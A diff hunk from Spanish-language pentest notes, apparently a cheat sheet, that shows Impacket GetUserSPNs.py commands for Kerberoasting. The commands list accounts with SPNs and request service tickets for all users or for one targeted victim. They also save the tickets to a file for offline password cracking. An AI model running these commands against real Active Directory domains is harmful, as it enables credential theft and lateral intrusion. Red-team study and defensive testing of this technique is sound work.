@@ -6,7 +6,7 @@ Listar los usuarios con SPN
 GetUserSPNs.py -dc-ip <dc_ip> <dominio>/<user>
 
 Pedir tickets para todos los usuarios:
-GetUserSPNs.py -dc-ip <ip_dc> <dominio>/<user> -request
+GetUserSPNs.py -dc-ip <ip_dc> <dominio>/<user>:'pass' -request
 
 Pedir tickets para un usuario puntual:
 GetUserSPNs.py -dc-ip <ip_dc> <dominio>/<user> -request-user <user_victima> -outputfile <file_de_guardado>  (es importante generar el export así luego podemos crackear el archivo)
